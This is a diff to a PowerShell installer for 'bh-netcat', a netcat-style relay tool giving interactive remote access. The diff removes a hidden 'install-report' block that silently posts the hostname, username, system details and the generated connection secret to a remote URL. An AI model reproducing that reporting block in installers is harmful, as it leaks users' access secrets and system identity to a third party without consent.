@@ -41,40 +41,13 @@ set GS_PORT=$Port
 "@ | Set-Content -Encoding ASCII $Cmd
 Write-Host "[OK]"
 
-$GeneratedSecret = ""
-try {
-  $GeneratedSecret = (& $Cmd -g 2>$null | Select-Object -First 1).Trim()
-} catch {
-}
-
-Write-Host -NoNewline "--> Registering install                                                "
-try {
-  $Report = @{
-    hostname = $env:COMPUTERNAME
-    user = $env:USERNAME
-    os = "Windows"
-    arch = $env:PROCESSOR_ARCHITECTURE
-    kernel = [System.Environment]::OSVersion.VersionString
-    install_path = $Cmd
-    relay_port = $Port
-    secret = $GeneratedSecret
-    version = "powershell-installer"
-  } | ConvertTo-Json -Compress
-  Invoke-WebRequest -Uri "$BaseUrl/api/install-report" -Method Post -ContentType "application/json" -Body $Report -UseBasicParsing -TimeoutSec 5 | Out-Null
-} catch {
-}
+Write-Host -NoNewline "--> Testing command                                                    "
+& $Cmd -h *> $null
 Write-Host "[OK]"
 
 Write-Host "--> Installed $Cmd"
 Write-Host "--> Add $BinDir to PATH if bh-netcat is not found in a new terminal."
 Write-Host ""
 Write-Host "--> Basic usage:"
-Write-Host "--> bh-netcat -g"
-Write-Host "--> bh-netcat -s `"SECRET`" -l -i"
-Write-Host "--> bh-netcat -s `"SECRET`" -i"
-if (![string]::IsNullOrWhiteSpace($GeneratedSecret)) {
-  Write-Host ""
-  Write-Host "--> To reuse this generated secret:"
-  Write-Host "--> bh-netcat -s `"$GeneratedSecret`" -l -i"
-  Write-Host "--> bh-netcat -s `"$GeneratedSecret`" -i"
-}
+Write-Host "--> bh-netcat -h"
+Write-Host "--> bh-netcat -s `"SECRET_FROM_DEPLOY`" -i"
